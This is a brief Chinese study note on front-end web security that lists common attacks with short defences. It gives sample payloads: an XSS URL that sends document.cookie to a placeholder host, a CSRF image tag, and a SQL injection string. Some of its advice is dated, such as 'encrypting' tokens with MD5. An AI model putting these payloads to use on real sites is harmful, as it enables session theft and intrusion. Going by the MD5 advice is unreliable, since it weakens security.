### 前端安全

常见攻击手段

* xss( cross-site scripting),跨域脚本攻击
  > `book.com/search?name=<script>document.location='http://vajoy/get?cookie='+document.cookie</script>`
  > 提供的免费wifi, 邮件, 链接
  > 对于XSS的预防自然也是对提交数据的过滤，另外还有一点——谨慎返回用户提交的内容！
  > 不要相信 任何 来自用户的输入（不仅限于 POST Body/QueryString/payload，甚至是 Headers）
* CSRF (Cross-site request forgery), 跨站点伪造攻击
  > a.com  `<a href="http://a.com/logout.php">登出</a>`
  > b.com  `<img src="http://a.com/logout.php">`
  > 给所有请求加上 token 检查。token 一般是随机字符串，只需确保其不可预测性即可。token 可以在 QueryString、POST body 甚至是 Custom Header 里，但千万不能在 Cookies 里。
* SQL注入, XPath
  > book.com/book?id=100 => book.com/book?id=100'or'1'='1
  > 对于这几个攻击，我们需要做的自然是对提交参数的过滤，最好是前端过滤一遍，后端也过滤一遍
* ddos(分布式拒绝服务), 
  > cdn
* http
  > 明文传输
* 重发攻击
  > 他知道这些数据的作用，就可以在不知道数据内容的情况下通过再次发送这些数据达到愚弄接收端的目的
  > 实现了流量攻击，即通过额外增加的数据流影响正常数据流的传输时延，耗用通信链路的带宽
  > 加随机数/加时间戳/加流水号 (微信签名)
* 中间人攻击
  > 是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。
* 网络劫持攻击
* cookie泄露

安全策略    

* 压缩compression, 混淆obfuscation, 加密encryption 增加客户端代码不可读性
* 非对称加密, 客户端的只能服务端解密
* 哈希进行信息摘要, md5加密token等信息
* Salt
* cookie加密 
* OAuth 2.0 授权
* token 随机, 每一次的请求携带下一次请求的token
